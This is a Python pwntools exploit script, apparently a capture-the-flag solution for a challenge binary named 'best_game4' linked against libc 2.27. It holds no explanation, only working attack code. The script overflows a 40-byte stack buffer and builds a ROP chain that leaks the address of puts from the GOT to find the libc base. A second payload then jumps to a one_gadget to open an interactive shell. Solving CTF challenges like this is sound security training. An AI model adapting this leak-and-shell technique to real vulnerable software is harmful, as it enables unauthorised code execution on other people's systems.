#!/usr/bin/env python3
from pwn import *

EXE_FILENAME='./tbg_files/the_best_game/bg4_docker/best_game4-libc-2.27'
LD_FILENAME = './tbg_files/the_best_game/bg4_docker/ld-2.27.so'
LIBC_FILENAME = './tbg_files/the_best_game/bg4_docker/libc-2.27.so'

exe = context.binary = ELF(EXE_FILENAME)
libc = ELF(LIBC_FILENAME)

argv = [EXE_FILENAME]
envp = {}

EIP_OFFSET = 40
POP_RDI = 0x00000000004008d3 # ropper --file ./best_game4 --search 'pop rdi'
RET = POP_RDI+1
ONE_GADGET = 0x4f322 #one_gadget libc-2.27.so 

def start():
	gdbscript = '''
	b *(quiz+1)
	continue
	telescope
	'''
	if args.GDB:
		return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
	else:
		return process([LD_FILENAME, EXE_FILENAME],
               env={"LD_LIBRARY_PATH": LIBC_FILENAME})


io = start()

io.sendlineafter(b'# ', 
                 b'a'*EIP_OFFSET
                + p64(POP_RDI)
                + p64(exe.got.puts)
                + p64(RET)
                + p64(exe.plt.puts)
                + p64(RET)
                + p64(exe.symbols.quiz)
                 )

io.recvuntil(b'game?!?\n')
l = io.recvline() [ :- 1]
current_puts = u64(l[:8].ljust(8, b'\x00'))
libc_base = current_puts - libc.symbols.puts
log.info('libc base = %x' % libc_base)

io.sendlineafter(b'# ',
    			 b'a'*EIP_OFFSET 
                 + p64(RET)
                 + p64(libc_base + ONE_GADGET) 
            )

io.interactive()